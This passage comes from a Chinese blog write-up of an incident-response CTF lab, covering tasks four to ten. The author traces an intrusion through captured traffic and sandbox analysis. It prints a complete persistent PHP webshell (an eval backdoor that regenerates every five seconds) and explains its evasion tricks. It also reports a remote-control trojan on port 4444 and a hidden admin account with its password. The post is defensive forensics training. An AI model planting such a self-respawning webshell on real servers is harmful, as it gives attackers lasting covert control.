+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767321148461-93925c62-ebde-4b1a-bd51-90f3679a78c6.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们继续追踪流，我们就能在流63发现写入了一个新的php文件，shell.php</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322054369-79d784fa-f599-4d80-9fa5-dbbe9302fcbb.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322085753-9e265741-162b-4e98-b381-18377e59d2cf.png" srcset="/img/loading.gif" lazyload></p>
+<p>并且将后边参数中的十六进制解码后追加写入了这个shell.php文件中，我们解码看看后边是什么</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322151667-a43bf094-6ea5-4c62-9066-29f5fca3bb8a.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现就是一句话木马，新的密码是qsnctf_2025_lab</p>
+<p>对着这个算一下MD5即可</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322196432-08a018b3-23fe-4688-ad45-9c6880a43ea8.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到flag{91a29f36879b024d661851b7765f3969}</p>
+<h2 id="任务四：提交黑客创建的不死马的密码"><a href="#任务四：提交黑客创建的不死马的密码" class="headerlink" title="任务四：提交黑客创建的不死马的密码"></a>任务四：提交黑客创建的不死马的密码</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322215868-2d351f19-460f-4166-b183-1a334a5cbe05.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322800347-20e3e08e-ffd5-4bb4-819a-ddf8e9ffa676.png" srcset="/img/loading.gif" lazyload></p>
+<p>上一题的木马位于的是&#x2F;cache&#x2F;chche_file&#x2F;configs.cache.php路径，很有可能是有存活期的，不是不死马</p>
+<p>且在虚拟机中搜索已经搜索不到我们之前的一句话木马</p>
+<p>因此我们应该继续寻找，寻找有写入命令的流量</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767322981002-c1184ffe-4bc7-4f38-871d-b997f8363349.png" srcset="/img/loading.gif" lazyload></p>
+<p>最后我们在流75成功寻找到了不死马的写入</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323086879-5313c8f5-45ae-4742-bf2f-8511124e3089.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php<br>ignore_user_abort(true);<br>set_time_limit(0);<br><br>$shell_content = &#x27;&lt;?php @eval($_POST[&quot;4aad625950d058c24711560e5f8445b9&quot;]); ?&gt;&#x27;;<br>$shell_path = __DIR__ . &#x27;/.config.php&#x27;;<br><br>while (true) &#123;<br>    if (!file_exists($shell_path)) &#123;<br>        file_put_contents($shell_path, $shell_content);<br>        chmod($shell_path, 0444); <br>    &#125;<br>    sleep(5);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>ignore_user_abort(true)确保了不会因为访问中断而被中止</p>
+<p>set_time_limit(0)保证无限循环</p>
+<p>还有检查是不是存在的 if (!file_exists($shell_path))，保证死了就再生</p>
+<p>最后再chmod一下改权限， sleep(5)防止cpu异常被发现</p>
+<p>是很标准的不死马设置，于是我们可以确定，不死马的密码就是4aad625950d058c24711560e5f8445b9</p>
+<p>所以flag{4aad625950d058c24711560e5f8445b9}</p>
+<p>当然了，都说不死了，肯定也存在于我们的网站文件里</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323287264-40778d13-e9b9-4b4f-96b4-eea550fae105.png" srcset="/img/loading.gif" lazyload></p>
+<p>在WWW路径即可找到这一个不死马，同样确认了密码</p>
+<h2 id="任务五：提交黑客上传的远控木马名称"><a href="#任务五：提交黑客上传的远控木马名称" class="headerlink" title="任务五：提交黑客上传的远控木马名称"></a>任务五：提交黑客上传的远控木马名称</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323320709-20f099f1-ec52-4a57-8369-d47031b8de81.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323405965-3c8958ea-50a2-4c7d-a763-667dd38a4b3a.png" srcset="/img/loading.gif" lazyload></p>
+<p>因为.config不死马上一回合已经生成，于是黑客开始干更危险的事儿了，我们继续往下追踪可以在流89发现上传了一个文件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323475762-6b65aa04-5d59-441e-a997-20931778d61b.png" srcset="/img/loading.gif" lazyload></p>
+<p>解码说是叫shell.exe</p>
+<p>我们直接把十六进制搞出来，然后把shell.exe做出来</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323676865-b40d6b27-71b0-4c5f-8434-b3e67a54899c.png" srcset="/img/loading.gif" lazyload></p>
+<p>根据文件头可以看到是典型的Windows PE可执行文件，很有可能是远控木马，我们扔到云沙箱看看</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767323986470-845b3ab9-ad24-40a7-a1fe-c5fa6eaf94a8.png" srcset="/img/loading.gif" lazyload></p>
+<p>实锤是木马了，所以本题的flag为flag{shell.exe}</p>
+<h2 id="任务六：提交上传的远控木马的MD5"><a href="#任务六：提交上传的远控木马的MD5" class="headerlink" title="任务六：提交上传的远控木马的MD5"></a>任务六：提交上传的远控木马的MD5</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324010982-d9da6d28-6f8b-4527-80d0-6e298881c10e.png" srcset="/img/loading.gif" lazyload></p>
+<p>上一题已经通过十六进制复原了，我们直接算这个exe程序的md5即可</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324061309-a2141c81-9e1e-4b40-b3de-a672e19a3551.png" srcset="/img/loading.gif" lazyload></p>
+<p>其实云沙箱直接算好了</p>
+<p>所以flag{0410284ea74b11d26f868ead6aa646e1}</p>
+<h2 id="任务七：提交黑客上传的远控木马的端口"><a href="#任务七：提交黑客上传的远控木马的端口" class="headerlink" title="任务七：提交黑客上传的远控木马的端口"></a>任务七：提交黑客上传的远控木马的端口</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324086459-e59976b1-8b19-4707-995d-a89b72bffc68.png" srcset="/img/loading.gif" lazyload></p>
+<p>云沙箱里边动态分析一下</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324125596-7ee0ed03-4e19-4004-a6cf-feaa8dd4e189.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现远控木马的端口是4444</p>
+<p>所以是flag{4444}</p>
+<h2 id="任务八：提交黑客创建用户账户的用户名"><a href="#任务八：提交黑客创建用户账户的用户名" class="headerlink" title="任务八：提交黑客创建用户账户的用户名"></a>任务八：提交黑客创建用户账户的用户名</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324172557-778873ef-da52-42e2-9031-bdc171e09739.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324804951-35566c7f-68b3-4aae-816b-8b7ce44cc704.png" srcset="/img/loading.gif" lazyload></p>
+<p>直接在设置里搜索即可发现账户中存在一个其他人员，所以这一题黑客创建的用户账户用户名即为hidden$</p>
+<p>所以答案就是flag{hidden$}</p>
+<h2 id="任务九：提交黑客创建用户账户的密码"><a href="#任务九：提交黑客创建用户账户的密码" class="headerlink" title="任务九：提交黑客创建用户账户的密码"></a>任务九：提交黑客创建用户账户的密码</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324886363-bdb0cf96-bf95-47f4-aba9-b16f84a31aa7.png" srcset="/img/loading.gif" lazyload></p>
+<p>就是去找上一题那个账户的密码而已（其实火眼能直接一把梭）</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767324932961-f08044ce-6096-4cae-b622-d004716cf5cb.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767325023104-19041fb4-c26b-40ba-8c89-7a5d736242b7.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果不用火眼的话，我们继续分析这个流量包，其实很久以前我们就能发现其 base64_decode(substr($_POST[“xxxx”],2))  的解码逻辑</p>
+<p>所以我们在这边继续解码</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767325102350-08fd199a-c83f-407f-89e8-0de71f72fa3b.png" srcset="/img/loading.gif" lazyload></p>
+<p>即可发现创建用户hidden$的时候同时设置的密码，成功了就echo，下边echo了，所以这一个成功了，就是这个</p>
+<p>flag{P@ssw0rd123}</p>
+<h2 id="任务十：请提交黑客创建用户账户的时间"><a href="#任务十：请提交黑客创建用户账户的时间" class="headerlink" title="任务十：请提交黑客创建用户账户的时间"></a>任务十：请提交黑客创建用户账户的时间</h2><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767325196204-5ad9402c-0aa6-4966-9480-dc226657517b.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767325227845-247f3817-26dd-4e4f-8d6b-3236fa45e6dc.png" srcset="/img/loading.gif" lazyload></p>
+<p>上一题我们已经找到了是流98</p>
+<p>下边有时间显示，注意时区，图片里的是GMT格林威治标准时间的</p>
+<p>所以转化为我们这边的东八区应该是2025&#x2F;11&#x2F;20 16:13:32</p>
+<p>flag{2025&#x2F;11&#x2F;20 16:13:32}</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767325536298-cdda9f93-9912-4c1f-aa4f-fb8fcc104d8d.png" srcset="/img/loading.gif" lazyload></p>
+<p>青少年靶场刷完了，期待上第二届solar杯的复现，预祝青少年CTF平台蒸蒸日上</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/%E9%9D%92%E5%B0%91%E5%B9%B4CTF%E9%9D%B6%E5%9C%BA/1767325474587-ddad9d26-3f2e-4d31-b000-8859988f8188.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们玄机见</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="category-chain-item">应急响应</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Misc/" class="print-no-link">#Misc</a>
+      
+        <a href="/tags/Reverse/" class="print-no-link">#Reverse</a>
+      
+        <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="print-no-link">#应急响应</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>应急响应练习：青少年CTF靶场（全）</div>
+      <div>https://mei-you-qian.github.io/2026/01/02/青少年CTF靶场/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Meiyouqian</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年1月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/12/22/2025SPC%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B/" title="2025SPC电子取证竞赛决赛">
+                        <span class="hidden-mobile">2025SPC电子取证竞赛决赛</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"cloud1-9g1zftrh46f4164f","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
